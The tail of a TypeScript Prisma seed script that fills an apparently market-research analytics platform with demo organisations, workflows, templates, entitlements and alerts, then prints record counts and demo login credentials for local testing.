        relationshipType: 'MANAGEMENT',
        status: 'ACTIVE',
        permissions: { canViewReports: true, canManageUsers: false, canAccessBilling: false },
        accessLevel: 'READ_ONLY',
        billingRelation: 'INDEPENDENT',
        initiatedBy: sarahEnterprise.id,
        approvedBy: adminUser.id,
        approvedAt: new Date(Date.now() - 30 * 24 * 60 * 60 * 1000),
        notes: 'Strategic partnership for market research',
      }
    })

    // Data sharing partnership
    await prisma.orgRelationship.create({
      data: {
        fromOrgId: acmeCorp.id,
        toOrgId: techStartup.id,
        relationshipType: 'DATA_SHARING',
        status: 'ACTIVE',
        permissions: { canShareInsights: true, canShareAudiences: true },
        accessLevel: 'READ_ONLY',
        billingRelation: 'INDEPENDENT',
        initiatedBy: adminUser.id,
        approvedBy: bobWilson.id,
        approvedAt: new Date(Date.now() - 15 * 24 * 60 * 60 * 1000),
      }
    })

    // Pending partnership request
    await prisma.orgRelationship.create({
      data: {
        fromOrgId: techStartup.id,
        toOrgId: enterpriseCo.id,
        relationshipType: 'PARTNERSHIP',
        status: 'PENDING',
        permissions: {},
        accessLevel: 'NONE',
        billingRelation: 'INDEPENDENT',
        initiatedBy: bobWilson.id,
        notes: 'Requesting partnership for joint research initiatives',
      }
    })
  })

  // ==================== SHARED RESOURCE ACCESS ====================
  console.log('📤 Creating shared resource access records...')

  await safeSeedSection('Shared Resource Access', async () => {
    await prisma.sharedResourceAccess.createMany({
      data: [
        {
          ownerOrgId: acmeCorp.id,
          targetOrgId: techStartup.id,
          resourceType: 'TEMPLATE',
          resourceId: null,
          accessLevel: 'READ_ONLY',
          canView: true,
          canEdit: false,
          canDelete: false,
          canShare: false,
          propagateToChildren: false,
          grantedBy: adminUser.id,
        },
        {
          ownerOrgId: enterpriseCo.id,
          targetOrgId: acmeCorp.id,
          resourceType: 'AUDIENCE',
          resourceId: null,
          accessLevel: 'READ_ONLY',
          canView: true,
          canEdit: false,
          canDelete: false,
          canShare: false,
          propagateToChildren: false,
          grantedBy: sarahEnterprise.id,
        },
        {
          ownerOrgId: acmeCorp.id,
          targetOrgId: enterpriseCo.id,
          resourceType: 'BRAND_TRACKING',
          resourceId: null,
          accessLevel: 'FULL_ACCESS',
          canView: true,
          canEdit: true,
          canDelete: false,
          canShare: true,
          propagateToChildren: true,
          grantedBy: adminUser.id,
        },
      ]
    })
  })

  // ==================== ROLE INHERITANCE RULES ====================
  console.log('👑 Creating role inheritance rules...')

  await safeSeedSection('Role Inheritance Rules', async () => {
    await prisma.roleInheritanceRule.createMany({
      data: [
        {
          orgId: enterpriseCo.id,
          name: 'Admin Propagation',
          description: 'Propagate admin role to child organizations',
          sourceRole: 'ADMIN',
          targetRole: 'ADMIN',
          inheritUp: false,
          inheritDown: true,
          inheritLevels: 2,
          requiresApproval: false,
          isActive: true,
          priority: 10,
          createdBy: sarahEnterprise.id,
        },
        {
          orgId: enterpriseCo.id,
          name: 'Viewer Access',
          description: 'Allow viewers to access child org data',
          sourceRole: 'VIEWER',
          targetRole: 'VIEWER',
          inheritUp: false,
          inheritDown: true,
          inheritLevels: 1,
          requiresApproval: false,
          isActive: true,
          priority: 5,
          createdBy: sarahEnterprise.id,
        },
      ]
    })
  })

  // ==================== HIERARCHY TEMPLATES ====================
  console.log('📋 Creating hierarchy templates...')

  await safeSeedSection('Hierarchy Templates', async () => {
    await prisma.hierarchyTemplate.createMany({
      data: [
        {
          name: 'Enterprise with Divisions',
          description: 'Standard enterprise structure with regional divisions',
          structure: {
            rootType: 'HOLDING_COMPANY',
            levels: [
              { type: 'DIVISION', maxChildren: 10 },
              { type: 'DEPARTMENT', maxChildren: 20 },
            ]
          },
          defaultSettings: { inheritSettings: true, allowChildOrgs: true },
          defaultPermissions: { canViewReports: true, canManageUsers: false },
          isPublic: true,
          usageCount: 15,
          createdBy: superAdmin?.id || 'system',
        },
        {
          name: 'Agency with Clients',
          description: 'Marketing agency structure with client management',
          structure: {
            rootType: 'AGENCY',
            levels: [
              { type: 'CLIENT', maxChildren: 100 },
            ]
          },
          defaultSettings: { inheritSettings: false, allowChildOrgs: false },
          defaultPermissions: { canViewReports: true, canAccessBilling: false },
          isPublic: true,
          usageCount: 8,
          createdBy: superAdmin?.id || 'system',
        },
        {
          name: 'Franchise Network',
          description: 'Franchise structure with regional franchisees',
          structure: {
            rootType: 'FRANCHISE',
            levels: [
              { type: 'REGIONAL', maxChildren: 10 },
              { type: 'FRANCHISEE', maxChildren: 50 },
            ]
          },
          defaultSettings: { inheritSettings: true, allowChildOrgs: true },
          defaultPermissions: { canShareData: true },
          isPublic: true,
          usageCount: 3,
          createdBy: superAdmin?.id || 'system',
        },
      ]
    })
  })

  // ==================== CROSS-ORG INVITATIONS ====================
  console.log('✉️ Creating cross-org invitations...')

  await safeSeedSection('Cross-Org Invitations', async () => {
    await prisma.crossOrgInvitation.createMany({
      data: [
        {
          fromOrgId: enterpriseCo.id,
          toEmail: 'partner@newcompany.com',
          relationshipType: 'PARTNERSHIP',
          proposedPermissions: { canViewReports: true, canShareData: true },
          proposedAccessLevel: 'READ_ONLY',
          message: 'We would like to invite you to join our partner network for collaborative research.',
          status: 'PENDING',
          expiresAt: new Date(Date.now() + 14 * 24 * 60 * 60 * 1000),
          createdBy: sarahEnterprise.id,
        },
        {
          fromOrgId: acmeCorp.id,
          toEmail: 'client@newbrand.io',
          relationshipType: 'MANAGEMENT',
          proposedPermissions: { fullAccess: true },
          proposedAccessLevel: 'FULL_ACCESS',
          message: 'Welcome to Acme! We would like to manage your analytics.',
          status: 'PENDING',
          expiresAt: new Date(Date.now() + 7 * 24 * 60 * 60 * 1000),
          createdBy: adminUser.id,
        },
        {
          fromOrgId: techStartup.id,
          toEmail: 'test@declined.com',
          relationshipType: 'DATA_SHARING',
          proposedPermissions: {},
          proposedAccessLevel: 'READ_ONLY',
          message: 'Data sharing request',
          status: 'DECLINED',
          declinedReason: 'Not interested at this time',
          expiresAt: new Date(Date.now() - 7 * 24 * 60 * 60 * 1000),
          createdBy: bobWilson.id,
        },
      ]
    })
  })

  // ==================== WORKFLOWS ====================
  console.log('⚙️ Creating workflows...')

  await safeSeedSection('Workflows', async () => {
    const workflow1 = await prisma.workflow.create({
      data: {
        orgId: acmeCorp.id,
        name: 'Weekly Market Analysis',
        description: 'Automated weekly market analysis with report generation',
        status: 'ACTIVE',
        isPublic: false,
        createdBy: adminUser.id,
        config: {
          schedule: 'weekly',
          steps: [
            { agentType: 'RESEARCH', order: 1 },
            { agentType: 'ANALYSIS', order: 2 },
            { agentType: 'REPORTING', order: 3 },
          ],
          notifications: { email: true, slack: false },
        },
      }
    })

    const workflow2 = await prisma.workflow.create({
      data: {
        orgId: acmeCorp.id,
        name: 'Brand Health Monitor',
        description: 'Daily brand sentiment monitoring and alerting',
        status: 'ACTIVE',
        isPublic: false,
        createdBy: johnDoe.id,
        config: {
          schedule: 'daily',
          steps: [
            { agentType: 'MONITORING', order: 1 },
            { agentType: 'ANALYSIS', order: 2 },
          ],
          alertThreshold: -0.2,
        },
      }
    })

    await prisma.workflow.create({
      data: {
        orgId: enterpriseCo.id,
        name: 'Quarterly Report Generation',
        description: 'Generate comprehensive quarterly reports for all clients',
        status: 'ACTIVE',
        isPublic: true,
        createdBy: sarahEnterprise.id,
        config: {
          schedule: 'quarterly',
          steps: [
            { agentType: 'RESEARCH', order: 1 },
            { agentType: 'ANALYSIS', order: 2 },
            { agentType: 'REPORTING', order: 3 },
          ],
          outputFormat: 'pdf',
        },
      }
    })

    // ==================== WORKFLOW RUNS ====================
    console.log('🏃 Creating workflow runs...')

    await prisma.workflowRun.createMany({
      data: [
        {
          workflowId: workflow1.id,
          status: 'COMPLETED',
          startedAt: new Date(Date.now() - 7 * 24 * 60 * 60 * 1000),
          completedAt: new Date(Date.now() - 7 * 24 * 60 * 60 * 1000 + 15 * 60 * 1000),
          result: { insightsGenerated: 12, reportUrl: '/reports/weekly-123' },
          metadata: { triggeredBy: 'schedule' },
        },
        {
          workflowId: workflow1.id,
          status: 'COMPLETED',
          startedAt: new Date(Date.now() - 14 * 24 * 60 * 60 * 1000),
          completedAt: new Date(Date.now() - 14 * 24 * 60 * 60 * 1000 + 18 * 60 * 1000),
          result: { insightsGenerated: 15, reportUrl: '/reports/weekly-122' },
          metadata: { triggeredBy: 'schedule' },
        },
        {
          workflowId: workflow2.id,
          status: 'RUNNING',
          startedAt: new Date(),
          metadata: { triggeredBy: 'schedule' },
        },
        {
          workflowId: workflow2.id,
          status: 'FAILED',
          startedAt: new Date(Date.now() - 1 * 24 * 60 * 60 * 1000),
          completedAt: new Date(Date.now() - 1 * 24 * 60 * 60 * 1000 + 5 * 60 * 1000),
          error: 'API rate limit exceeded',
          metadata: { triggeredBy: 'schedule' },
        },
      ]
    })
  })

  // ==================== TEMPLATES ====================
  console.log('📄 Creating templates...')

  await safeSeedSection('Templates', async () => {
    await prisma.template.createMany({
      data: [
        {
          orgId: acmeCorp.id,
          name: 'Brand Analysis Prompt',
          description: 'Standard prompt template for brand analysis tasks',
          type: 'ANALYSIS',
          content: 'Analyze the brand {{brand_name}} across the following dimensions: awareness, sentiment, loyalty, and purchase intent. Focus on the {{target_audience}} demographic.',
          variables: ['brand_name', 'target_audience'],
          isPublic: false,
          usageCount: 45,
          createdBy: adminUser.id,
        },
        {
          orgId: acmeCorp.id,
          name: 'Market Research Summary',
          description: 'Template for generating market research summaries',
          type: 'REPORT',
          content: 'Generate a comprehensive market research summary for {{industry}} focusing on {{key_metrics}}. Include competitive analysis and trend forecasts.',
          variables: ['industry', 'key_metrics'],
          isPublic: true,
          usageCount: 28,
          createdBy: johnDoe.id,
        },
        {
          orgId: enterpriseCo.id,
          name: 'Executive Dashboard Report',
          description: 'Template for C-level executive reports',
          type: 'DASHBOARD',
          content: 'Executive summary for {{quarter}} showing key performance indicators, market trends, and strategic recommendations.',
          variables: ['quarter'],
          isPublic: true,
          usageCount: 67,
          createdBy: sarahEnterprise.id,
        },
      ]
    })
  })

  // ==================== MEMORY ====================
  console.log('🧠 Creating agent memories...')

  await safeSeedSection('Agent Memory', async () => {
    await prisma.memory.createMany({
      data: [
        {
          orgId: acmeCorp.id,
          agentId: marketResearchAgent.id,
          key: 'preferred_data_sources',
          value: { sources: ['gwi-platform', 'competitor-feeds', 'social-media'], lastUpdated: new Date().toISOString() },
          type: 'PREFERENCE',
        },
        {
          orgId: acmeCorp.id,
          agentId: marketResearchAgent.id,
          key: 'industry_context',
          value: { industry: 'Technology', focusAreas: ['AI', 'Cloud', 'Security'], competitors: ['CompA', 'CompB'] },
          type: 'CONTEXT',
        },
        {
          orgId: acmeCorp.id,
          agentId: audienceAnalysisAgent.id,
          key: 'segment_definitions',
          value: { segments: ['millennials', 'gen-z', 'professionals'], metrics: ['engagement', 'sentiment'] },
          type: 'CONTEXT',
        },
        {
          orgId: acmeCorp.id,
          key: 'org_preferences',
          value: { timezone: 'America/New_York', reportFormat: 'pdf', notificationPrefs: { email: true, slack: true } },
          type: 'PREFERENCE',
        },
      ]
    })
  })

  // ==================== TENANT ENTITLEMENTS ====================
  console.log('🎫 Creating tenant entitlements...')

  await safeSeedSection('Tenant Entitlements', async () => {
    await prisma.tenantEntitlement.createMany({
      data: [
        {
          orgId: enterpriseCo.id,
          featureId: featureAdvancedAnalytics.id,
          isEnabled: true,
          customLimits: { maxReports: 1000, maxAgentRuns: 10000 },
          expiresAt: new Date(Date.now() + 365 * 24 * 60 * 60 * 1000),
          grantedBy: superAdmin?.id || 'system',
          reason: 'Enterprise plan upgrade bonus',
        },
        {
          orgId: enterpriseCo.id,
          featureId: featureCustomAgents.id,
          isEnabled: true,
          customLimits: { maxCustomAgents: 50 },
          grantedBy: superAdmin?.id || 'system',
          reason: 'Premium feature access',
        },
        {
          orgId: acmeCorp.id,
          featureId: featureDataExport.id,
          isEnabled: true,
          customLimits: { maxExportsPerMonth: 100 },
          expiresAt: new Date(Date.now() + 180 * 24 * 60 * 60 * 1000),
          grantedBy: platformAdmin?.id || 'system',
          reason: 'Trial of premium export feature',
        },
        {
          orgId: techStartup.id,
          featureId: featureApiAccess.id,
          isEnabled: true,
          customLimits: { rateLimit: 1000 },
          grantedBy: superAdmin?.id || 'system',
          reason: 'Developer tier API access',
        },
      ]
    })
  })

  // ==================== HIERARCHY AUDIT LOGS ====================
  console.log('📜 Creating hierarchy audit logs...')

  await safeSeedSection('Hierarchy Audit Logs', async () => {
    await prisma.hierarchyAuditLog.createMany({
      data: [
        {
          orgId: enterpriseCo.id,
          action: 'ORG_CREATED',
          performedBy: sarahEnterprise.id,
          details: { orgName: 'Enterprise Solutions Ltd', planTier: 'ENTERPRISE' },
          previousState: null,
          newState: { status: 'active', planTier: 'ENTERPRISE' },
        },
        {
          orgId: enterpriseCo.id,
          action: 'RELATIONSHIP_CREATED',
          performedBy: sarahEnterprise.id,
          targetOrgId: acmeCorp.id,
          details: { relationshipType: 'MANAGEMENT', status: 'ACTIVE' },
          previousState: null,
          newState: { relationshipType: 'MANAGEMENT', status: 'ACTIVE' },
        },
        {
          orgId: acmeCorp.id,
          action: 'SETTINGS_UPDATED',
          performedBy: adminUser.id,
          details: { settingsChanged: ['timezone', 'features'] },
          previousState: { timezone: 'UTC' },
          newState: { timezone: 'America/New_York' },
        },
        {
          orgId: acmeCorp.id,
          action: 'MEMBER_ADDED',
          performedBy: adminUser.id,
          details: { userId: janeSmith.id, role: 'MEMBER' },
          newState: { memberCount: 5 },
        },
      ]
    })
  })

  // ==================== ENTITY VERSIONS ====================
  console.log('📚 Creating entity versions...')

  await safeSeedSection('Entity Versions', async () => {
    await prisma.entityVersion.createMany({
      data: [
        {
          entityType: 'REPORT',
          entityId: 'report-123',
          version: 1,
          data: { title: 'Q4 Market Analysis', status: 'DRAFT' },
          changedBy: adminUser.id,
          changeReason: 'Initial creation',
        },
        {
          entityType: 'REPORT',
          entityId: 'report-123',
          version: 2,
          data: { title: 'Q4 Market Analysis', status: 'PUBLISHED' },
          changedBy: johnDoe.id,
          changeReason: 'Published after review',
        },
        {
          entityType: 'DASHBOARD',
          entityId: 'dashboard-456',
          version: 1,
          data: { name: 'Executive Dashboard', widgets: 5 },
          changedBy: sarahEnterprise.id,
          changeReason: 'Initial creation',
        },
        {
          entityType: 'AGENT',
          entityId: marketResearchAgent.id,
          version: 1,
          data: { name: 'Market Research Agent', status: 'ACTIVE' },
          changedBy: adminUser.id,
          changeReason: 'Agent configuration update',
        },
      ]
    })
  })

  // ==================== ANALYSIS HISTORY ====================
  console.log('📊 Creating analysis history...')

  await safeSeedSection('Analysis History', async () => {
    await prisma.analysisHistory.createMany({
      data: [
        {
          orgId: acmeCorp.id,
          analysisType: 'BRAND_HEALTH',
          parameters: { brand: 'Nike', period: '30d', metrics: ['awareness', 'sentiment'] },
          results: { awareness: 92, sentiment: 0.78, trendDirection: 'up' },
          duration: 45000,
          status: 'COMPLETED',
          createdBy: johnDoe.id,
        },
        {
          orgId: acmeCorp.id,
          analysisType: 'MARKET_RESEARCH',
          parameters: { industry: 'Technology', region: 'North America' },
          results: { marketSize: '45B', growthRate: 12.5, keyPlayers: ['A', 'B', 'C'] },
          duration: 120000,
          status: 'COMPLETED',
          createdBy: adminUser.id,
        },
        {
          orgId: enterpriseCo.id,
          analysisType: 'COMPETITOR_ANALYSIS',
          parameters: { competitors: ['CompA', 'CompB'], metrics: ['market_share', 'sentiment'] },
          results: { summary: 'Analysis complete', findings: 8 },
          duration: 90000,
          status: 'COMPLETED',
          createdBy: sarahEnterprise.id,
        },
      ]
    })
  })

  // ==================== CHANGE SUMMARIES ====================
  console.log('📋 Creating change summaries...')

  await safeSeedSection('Change Summaries', async () => {
    await prisma.changeSummary.createMany({
      data: [
        {
          orgId: acmeCorp.id,
          period: 'WEEKLY',
          startDate: new Date(Date.now() - 7 * 24 * 60 * 60 * 1000),
          endDate: new Date(),
          summary: { totalChanges: 45, categories: { reports: 12, dashboards: 8, agents: 5, other: 20 } },
          highlights: ['New brand tracking setup', '3 reports published', '2 new team members added'],
          metrics: { engagement: '+15%', agentRuns: 234, reportsGenerated: 12 },
        },
        {
          orgId: acmeCorp.id,
          period: 'MONTHLY',
          startDate: new Date(Date.now() - 30 * 24 * 60 * 60 * 1000),
          endDate: new Date(),
          summary: { totalChanges: 180, categories: { reports: 45, dashboards: 25, agents: 20, other: 90 } },
          highlights: ['Major platform update', 'New API integrations', 'Team expansion'],
          metrics: { engagement: '+28%', agentRuns: 890, reportsGenerated: 45 },
        },
        {
          orgId: enterpriseCo.id,
          period: 'WEEKLY',
          startDate: new Date(Date.now() - 7 * 24 * 60 * 60 * 1000),
          endDate: new Date(),
          summary: { totalChanges: 120, categories: { reports: 35, dashboards: 20, agents: 15, other: 50 } },
          highlights: ['Enterprise SSO configured', '5 new client integrations', 'Quarterly reports completed'],
          metrics: { engagement: '+22%', agentRuns: 567, reportsGenerated: 35 },
        },
      ]
    })
  })

  // ==================== USER CHANGE TRACKERS ====================
  console.log('👁️ Creating user change trackers...')

  await safeSeedSection('User Change Trackers', async () => {
    await prisma.userChangeTracker.createMany({
      data: [
        {
          userId: adminUser.id,
          entityType: 'REPORT',
          entityId: 'report-123',
          lastViewedVersion: 2,
          lastViewedAt: new Date(Date.now() - 1 * 24 * 60 * 60 * 1000),
        },
        {
          userId: johnDoe.id,
          entityType: 'DASHBOARD',
          entityId: 'dashboard-456',
          lastViewedVersion: 1,
          lastViewedAt: new Date(Date.now() - 2 * 24 * 60 * 60 * 1000),
        },
        {
          userId: janeSmith.id,
          entityType: 'AGENT',
          entityId: marketResearchAgent.id,
          lastViewedVersion: 1,
          lastViewedAt: new Date(Date.now() - 3 * 24 * 60 * 60 * 1000),
        },
        {
          userId: sarahEnterprise.id,
          entityType: 'REPORT',
          entityId: 'report-789',
          lastViewedVersion: 3,
          lastViewedAt: new Date(),
        },
      ]
    })
  })

  // ==================== CHANGE ALERTS ====================
  console.log('🔔 Creating change alerts...')

  await safeSeedSection('Change Alerts', async () => {
    await prisma.changeAlert.createMany({
      data: [
        {
          orgId: acmeCorp.id,
          name: 'Brand Sentiment Drop Alert',
          description: 'Alert when brand sentiment drops below threshold',
          entityType: 'BRAND_TRACKING',
          conditions: { metricType: 'sentiment', threshold: -0.2, comparison: 'less_than' },
          notificationChannels: ['EMAIL', 'SLACK'],
          recipients: [adminUser.id, johnDoe.id],
          isActive: true,
          lastTriggered: new Date(Date.now() - 5 * 24 * 60 * 60 * 1000),
          triggerCount: 3,
          createdBy: adminUser.id,
        },
        {
          orgId: acmeCorp.id,
          name: 'High API Usage Alert',
          description: 'Alert when API usage exceeds 80% of limit',
          entityType: 'USAGE',
          conditions: { metricType: 'api_calls', threshold: 0.8, comparison: 'greater_than' },
          notificationChannels: ['EMAIL'],
          recipients: [adminUser.id],
          isActive: true,
          triggerCount: 1,
          createdBy: adminUser.id,
        },
        {
          orgId: enterpriseCo.id,
          name: 'New Competitor Activity',
          description: 'Alert when significant competitor activity detected',
          entityType: 'COMPETITOR',
          conditions: { activityType: 'any', significance: 'high' },
          notificationChannels: ['EMAIL', 'IN_APP'],
          recipients: [sarahEnterprise.id, enterpriseUser2.id],
          isActive: true,
          lastTriggered: new Date(Date.now() - 2 * 24 * 60 * 60 * 1000),
          triggerCount: 7,
          createdBy: sarahEnterprise.id,
        },
        {
          orgId: acmeCorp.id,
          name: 'Weekly Report Ready',
          description: 'Notification when weekly reports are generated',
          entityType: 'REPORT',
          conditions: { reportType: 'weekly', status: 'completed' },
          notificationChannels: ['IN_APP'],
          recipients: [adminUser.id, johnDoe.id, janeSmith.id],
          isActive: false,
          triggerCount: 12,
          createdBy: johnDoe.id,
        },
      ]
    })
  })

  } catch (enterpriseError: unknown) {
    // Log warning but continue - enterprise platform data is optional
    console.log('⚠️  Skipping enterprise platform seed data (tables may not be migrated yet)')
    if (enterpriseError && typeof enterpriseError === 'object' && 'message' in enterpriseError) {
      console.log(`   Reason: ${(enterpriseError as Error).message.split('\n')[0]}`)
    }
  }

  console.log('\n📊 Summary:')
  console.log('   Organizations: 6')
  console.log('   Users: 12')
  console.log('   Organization Memberships: 16')
  console.log('   Agents: 7')
  console.log('   Agent Runs: 15+')
  console.log('   Data Sources: 7')
  console.log('   Insights: 7')
  console.log('   Audiences: 11')
  console.log('   Crosstabs: 16')
  console.log('   Dashboards: 7')
  console.log('   Charts: 10')
  console.log('   Reports: 20')
  console.log('   Audit Logs: 10')
  console.log('   Usage Records: 150+')
  console.log('   Billing Subscriptions: 3')
  console.log('   API Keys: 3')
  console.log('   Invitations: 4')
  console.log('   SSO Configurations: 1')
  console.log('   Brand Trackings: 8 (Nike, Spotify, Tesla, Patagonia, Oatly, Airbnb, Peloton, Notion)')
  console.log('   Brand Tracking Snapshots: 378+ (52+45+78+36+28+42+65+32 weekly snapshots)')
  console.log('')
  console.log('   === Admin Portal Data ===')
  console.log('   Super Admins: 5')
  console.log('   Feature Flags: 14')
  console.log('   System Rules: 12')
  console.log('   Support Tickets: 14')
  console.log('   Ticket Responses: 4')
  console.log('   Tenant Health Scores: 12')
  console.log('   System Notifications: 4')
  console.log('   Platform Audit Logs: 14')
  console.log('   System Config: 8')
  console.log('   User Bans: 3')
  console.log('   Organization Suspensions: 3')
  console.log('')
  console.log('   === New Admin Modules ===')
  console.log('   Security Policies: 8')
  console.log('   Security Violations: 15')
  console.log('   Threat Events: 12')
  console.log('   IP Blocklist: 7')
  console.log('   Compliance Frameworks: 5 (SOC2, HIPAA, GDPR, ISO27001, PCI-DSS)')
  console.log('   Compliance Attestations: 6')
  console.log('   Compliance Audits: 5')
  console.log('   Legal Holds: 4')
  console.log('   Data Exports: 7')
  console.log('   Data Retention Policies: 6')
  console.log('   Platform Incidents: 6')
  console.log('   Incident Updates: 11')
  console.log('   Maintenance Windows: 5')
  console.log('   Release Management: 6')
  console.log('   Capacity Metrics: 19')
  console.log('   Domain Verifications: 6')
  console.log('   Enterprise SSO Configs: 4')
  console.log('   SCIM Integrations: 3')
  console.log('   Device Policies: 4')
  console.log('   Trusted Devices: 10')
  console.log('   API Clients: 8')
  console.log('   Webhook Endpoints: 7')
  console.log('   Webhook Deliveries: 10')
  console.log('   Integration Apps: 14')
  console.log('   Integration Installs: 7')
  console.log('   Analytics Snapshots: 30 (daily for last 30 days)')
  console.log('   Custom Reports: 8')
  console.log('   Broadcast Messages: 11')
  console.log('')
  console.log('   === Hierarchy & Collaboration ===')
  console.log('   Organization Relationships: 3')
  console.log('   Shared Resource Access: 3')
  console.log('   Role Inheritance Rules: 2')
  console.log('   Hierarchy Templates: 3')
  console.log('   Cross-Org Invitations: 3')
  console.log('   Hierarchy Audit Logs: 4')
  console.log('')
  console.log('   === Workflows & Templates ===')
  console.log('   Workflows: 3')
  console.log('   Workflow Runs: 4')
  console.log('   Templates: 3')
  console.log('   Agent Memories: 4')
  console.log('')
  console.log('   === Entitlements & Tracking ===')
  console.log('   Tenant Entitlements: 4')
  console.log('   Entity Versions: 4')
  console.log('   Analysis History: 3')
  console.log('   Change Summaries: 3')
  console.log('   User Change Trackers: 4')
  console.log('   Change Alerts: 4')

  console.log('\n🔑 Test Credentials:')
  console.log('')
  console.log('   ═══════════════════════════════════════════════════════════')
  console.log('   PLATFORM LOGIN (Regular Users)')
  console.log('   ═══════════════════════════════════════════════════════════')
  console.log('   Demo User (easiest):')
  console.log('     Email: demo@example.com')
  console.log('     Password: demo123')
  console.log('   ────────────────────────────────────────')
  console.log('   Admin User (Acme Corp Owner):')
  console.log('     Email: admin@acme.com')
  console.log('     Password: Password123!')
  console.log('   ────────────────────────────────────────')
  console.log('   All other platform users use: Password123!')
  console.log('')
  console.log('   ═══════════════════════════════════════════════════════════')
  console.log('   ADMIN PORTAL LOGIN (Super Admins)')
  console.log('   ═══════════════════════════════════════════════════════════')
  console.log('   Demo Admin (easiest):')
  console.log('     Email: demo-admin@gwi.com')
  console.log('     Password: demo123')
  console.log('     Role: SUPER_ADMIN (full access)')
  console.log('   ────────────────────────────────────────')
  console.log('   Super Administrator:')
  console.log('     Email: superadmin@gwi.com')
  console.log('     Password: SuperAdmin123!')
  console.log('     Role: SUPER_ADMIN (full access)')
  console.log('   ────────────────────────────────────────')
  console.log('   Platform Admin:')
  console.log('     Email: admin@gwi.com')
  console.log('     Password: Admin123!')
  console.log('     Role: ADMIN (standard admin ops)')
  console.log('   ────────────────────────────────────────')
  console.log('   Support Agent:')
  console.log('     Email: support@gwi.com')
  console.log('     Password: Support123!')
  console.log('     Role: SUPPORT (customer support)')
  console.log('   ────────────────────────────────────────')
  console.log('   Data Analyst:')
  console.log('     Email: analyst@gwi.com')
  console.log('     Password: Analyst123!')
  console.log('     Role: ANALYST (read-only analytics)')
  console.log('')
}

main()
  .catch((e) => {
    console.error('❌ Seeding failed:', e)
    process.exit(1)
  })
  .finally(async () => {
    await prisma.$disconnect()
  })
